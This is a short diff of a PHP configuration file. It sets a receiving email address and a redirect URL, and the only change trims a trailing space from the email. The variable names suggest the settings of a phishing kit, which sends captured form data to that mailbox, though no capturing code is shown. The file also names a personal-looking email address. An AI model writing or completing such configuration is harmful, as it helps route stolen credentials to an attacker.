@@ -1,4 +1,4 @@
 <?php 
-$Receive_email="tom.wilsoncrumley@gmail.com ";
+$Receive_email="tom.wilsoncrumley@gmail.com";
 $redirect="https://avsfax.com";
 ?>
